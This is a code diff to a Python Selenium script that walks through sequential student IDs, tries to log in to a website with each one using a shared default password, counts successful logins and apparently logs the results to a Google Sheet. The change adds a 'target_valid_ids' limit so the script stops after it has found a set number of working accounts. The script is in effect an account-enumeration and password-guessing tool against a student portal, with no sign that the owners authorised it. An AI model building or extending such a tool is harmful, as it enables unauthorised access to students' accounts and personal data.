@@ -17,7 +17,8 @@ def read_config(config_file="config.txt"):
         "direction": "decrease",
         "password": "1234567",
         "max_consecutive_fails": 100,
-        "step_sizes": [10, 100, 1000]
+        "step_sizes": [10, 100, 1000],
+        "target_valid_ids": 10
     }
     if os.path.exists(config_file):
         with open(config_file, "r", encoding="utf-8") as f:
@@ -26,7 +27,7 @@ def read_config(config_file="config.txt"):
                     key, value = line.strip().split("=", 1)
                     if key == "step_sizes":
                         config[key] = [int(x) for x in value.split(",")]
-                    elif key == "max_consecutive_fails":
+                    elif key in ["max_consecutive_fails", "target_valid_ids"]:
                         config[key] = int(value)
                     else:
                         config[key] = value
@@ -72,11 +73,13 @@ try:
     password = config["password"]
     max_consecutive_fails = config["max_consecutive_fails"]
     step_sizes = config["step_sizes"]
+    target_valid_ids = config["target_valid_ids"]
 
     # Read progress or start from config
     current_id = read_progress() or start_id
     consecutive_fails = 0
     step_index = 0  # Index for step_sizes (0=1, 1=10, 2=100, 3=1000)
+    valid_ids_found = 0  # Counter for successful logins
 
     # Set up Google Sheets API
     credentials_file = "credentials.json"
@@ -98,8 +101,8 @@ try:
     except gspread.exceptions.SpreadsheetNotFound:
         raise Exception(f"Google Sheet with ID '{sheet_id}' not found or not accessible.")
 
-    while step_index < len(step_sizes) + 1:
-        print(f"Trying student ID: {current_id}")
+    while step_index < len(step_sizes) + 1 and valid_ids_found < target_valid_ids:
+        print(f"Trying student ID: {current_id} (Valid IDs found: {valid_ids_found}/{target_valid_ids})")
         driver.delete_all_cookies()  # Clear cookies for a clean session
 
         # Login
@@ -130,9 +133,10 @@ try:
 
             print("Waiting for page to load after login...")
             try:
-                WebDriverWait(driver, 30).until_not(EC.url_contains("login"))
+                WebDriverWait(driver, 20).until_not(EC.url_contains("login"))
                 print(f"Login successful. Current URL: {driver.current_url}")
                 consecutive_fails = 0  # Reset failure counter
+                valid_ids_found += 1  # Increment valid ID counter
             except:
                 print(f"Login failed for ID {current_id}")
                 consecutive_fails += 1
@@ -239,6 +243,11 @@ try:
             # Update progress
             write_progress(current_id)
             current_id = generate_next_id(current_id, direction, step=1)
+
+            # Check if target valid IDs reached
+            if valid_ids_found >= target_valid_ids:
+                print(f"Reached target of {target_valid_ids} valid IDs. Stopping.")
+                break
 
         except Exception as e:
             print(f"Error during processing for ID {current_id}: {str(e)}")
